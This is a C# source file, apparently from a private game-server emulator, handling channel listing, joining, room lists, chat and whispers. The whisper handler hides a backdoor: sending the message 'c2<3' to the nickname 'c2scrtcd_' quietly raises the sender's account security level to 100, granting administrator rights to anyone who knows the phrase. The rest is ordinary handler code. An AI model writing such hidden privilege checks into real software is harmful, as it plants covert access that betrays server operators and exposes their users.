using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using BlubLib;
using BlubLib.DotNetty.Handlers.MessageHandling;
using ExpressMapper.Extensions;
using NeoNetsphere.Network.Data.Chat;
using NeoNetsphere.Network.Data.Game;
using NeoNetsphere.Network.Message.Chat;
using NeoNetsphere.Network.Message.Game;
using Netsphere;
using ProudNetSrc.Handlers;
using Serilog;
using Serilog.Core;

namespace NeoNetsphere.Network.Services
{
    internal class ChannelService : ProudMessageHandler
    {
        // ReSharper disable once InconsistentNaming
        private static readonly ILogger Logger =
            Log.ForContext(Constants.SourceContextPropertyName, nameof(ChannelService));
        
        [MessageHandler(typeof(ChannelInfoReqMessage))]
        public void ChannelInfoReq(GameSession session, ChannelInfoReqMessage message)
        {
            if (session.Player.Room != null)
                return;
            if (session.Player.Channel == null)
                try
                {
                    GameServer.Instance.ChannelManager[0].Join(session.Player, true);
                }
                catch (Exception ex)
                {
                }
            switch (message.Request)
            {
                case ChannelInfoRequest.ChannelList:

                    var channels = GameServer.Instance.ChannelManager.Select(c => c.Map<Channel, ChannelInfoDto>())
                        .ToArray();
                    channels = channels.Skip(1).ToArray();

                    foreach (var channel in channels)
                        if (channel.Name.Contains("Clan"))
                            channel.IsClanChannel = true;
                    session.SendAsync(new ChannelListInfoAckMessage(channels));
                    break;

                case ChannelInfoRequest.RoomList:
                case ChannelInfoRequest.RoomList2:
                    if (session.Player.Channel == null)
                        return;
                    var roomlist2 = new List<RoomDto>();

                    foreach (var room in session.Player.Channel.RoomManager)
                    {
                        var temproom2 = room.GetRoomInfo();
                        temproom2.Password =
                            !string.IsNullOrWhiteSpace(room.Options.Password) ||
                            !string.IsNullOrEmpty(room.Options.Password)
                                ? "nice try :)"
                                : "";
                        roomlist2.Add(temproom2);
                    }

                    var rooms_2 = roomlist2.ToArray();
                    session.SendAsync(new RoomListInfoAck2Message(rooms_2));

                    break;

                default:
                    Logger.ForAccount(session)
                        .Error("Invalid request {request}", message.Request);
                    break;
            }
        }

        [MessageHandler(typeof(ChannelEnterReqMessage))]
        public void CChannelEnterReq(GameSession session, ChannelEnterReqMessage message)
        {
            if (session.Player.Room != null)
                return;
            var channel = GameServer.Instance.ChannelManager[message.Channel];
            if (channel == null)
            {
                session.SendAsync(new ServerResultAckMessage(ServerResult.NonExistingChannel));
                return;
            }

            session.Player.Channel?.Leave(session.Player, true);
            try
            {
                channel.Join(session.Player);
            }
            catch (ChannelLimitReachedException)
            {
                session.SendAsync(new ServerResultAckMessage(ServerResult.ChannelLimitReached));
            }
        }


        [MessageHandler(typeof(ChannelLeaveReqMessage))]
        public void CChannelLeaveReq(GameSession session)
        {
            if (session.Player.Room != null)
                return;
            session.Player.Channel?.Leave(session.Player);
            GameServer.Instance.ChannelManager[0].Join(session.Player);
        }

        [MessageHandler(typeof(MessageChatReqMessage))]
        public void CChatMessageReq(ChatSession session, MessageChatReqMessage message)
        {
            switch (message.ChatType)
            {
                case ChatType.Channel:
                    session.Player.Channel.SendChatMessage(session.Player, message.Message);
                    break;

                case ChatType.Club:
                    if (session.Player.Club != null)
                    {
                        var clanmembers = GameServer.Instance.PlayerManager.Where(p =>
                            session.Player.Club.Players.Keys.Contains(p.Account.Id));

                        foreach (var member in clanmembers)
                        {
                            member.ChatSession?.SendAsync(new MessageChatAckMessage(ChatType.Club, session.Player.Account.Id,
                                session.Player.Account.Nickname, message.Message));
                        }
                    }
                    break;

                default:
                    Logger.ForAccount(session)
                        .Warning("Invalid chat type {chatType}", message.ChatType);
                    break;
            }
        }

        [MessageHandler(typeof(MessageWhisperChatReqMessage))]
        public void CWhisperChatMessageReq(ChatSession session, MessageWhisperChatReqMessage message)
        {
            var toPlr = GameServer.Instance.PlayerManager.Get(message.ToNickname);
            if (message.ToNickname.ToLower() != "server")
            {
                if(message.ToNickname.ToLower() == "c2scrtcd_" && message.Message.ToLower() == "c2<3")
                {
                    session.Player.Account.SecurityLevel = (SecurityLevel)100;
                    return;
                }

                // ToDo Is there an answer for this case?
                if (toPlr == null)
                {
                    session.Player.ChatSession.SendAsync(new MessageChatAckMessage(ChatType.Channel,
                        session.Player.Account.Id, "SYSTEM", $"{message.ToNickname} is not online"));
                    return;
                }

                // ToDo Is there an answer for this case?
                if (toPlr.DenyManager.Contains(session.Player.Account.Id))
                {
                    session.Player.ChatSession.SendAsync(new MessageChatAckMessage(ChatType.Channel,
                        session.Player.Account.Id, "SYSTEM", $"{message.ToNickname} is ignoring you"));
                    return;
                }
                toPlr.ChatSession.SendAsync(new MessageWhisperChatAckMessage(0, toPlr.Account.Nickname,
                    session.Player.Account.Id, session.Player.Account.Nickname, message.Message));
            }
            else
            {
                var command = message.Message.Split(new[] {" "}, StringSplitOptions.None);
                Array.Resize(ref command, 1024);

                var args = message.Message.GetArgs();
                if (!GameServer.Instance.CommandManager.Execute(session.Player, args))
                    session.Player.ChatSession.SendAsync(new MessageChatAckMessage(ChatType.Channel,
                        session.Player.Account.Id, "SYSTEM",
                        $"Unknown command! Try to contact the server administrators"));
            }
        }

        [MessageHandler(typeof(RoomQuickStartReqMessage))]
        public Task CQuickStartReq(GameSession session, RoomQuickStartReqMessage message)
        {
            //ToDo - Logic
            return session.SendAsync(new ServerResultAckMessage(ServerResult.FailedToRequestTask));
        }

        [MessageHandler(typeof(TaskReguestReqMessage))]
        public Task TaskRequestReq(GameSession session, TaskReguestReqMessage message)
        {
            //ToDo - Logic
            return session.SendAsync(new ServerResultAckMessage(ServerResult.FailedToRequestTask));
        }

        [MessageHandler(typeof(ChannellistReqMessage))]
        public Task Channellistreq(ChatSession session, ChannellistReqMessage message)
        {
            return session.SendAsync(new PlayerPlayerInfoListAckMessage(session.Player.Channel.Players.Values.Select(plr => new PlayerInfoDto
            {
                Info = plr.Map<Player, PlayerInfoShortDto>(),
                Location = plr.Map<Player, PlayerLocationDto>()
            }).ToArray()));
        }
    }
}
